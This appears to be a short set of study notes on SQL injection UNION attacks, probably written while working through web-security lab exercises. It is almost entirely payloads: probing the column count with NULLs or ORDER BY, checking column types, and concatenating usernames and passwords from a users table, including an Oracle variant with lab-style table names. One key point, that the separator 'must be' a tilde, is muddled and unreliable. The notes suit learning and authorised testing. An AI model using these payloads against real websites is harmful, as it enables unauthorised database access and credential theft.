## UNION Attacks
Determine the number of columns needed. (`NULL`Â is convertible to every commonly used data type)

```
' UNION SELECT NULL,NULL-- keep increasing NULL values until error

or

' ORDER BY 1-- keep increasing number until error
```

Check the type of data in the column

```
' UNION SELECT NULL,'stringdata',NULL FROM users--
```

Combine multiple values into one column

*Key Points:
 - It must be '~', not double quotes!* 

```
' UNION SELECT null,username || '~' || password FROM users--
```

Oracle

```
category=Lifestyle' UNION SELECT column1,column2 FROM table_name--
category=Lifestyle' UNION SELECT USERNAME_UYYSPE,PASSWORD_AVRHVL FROM USERS_OFHITN--
```
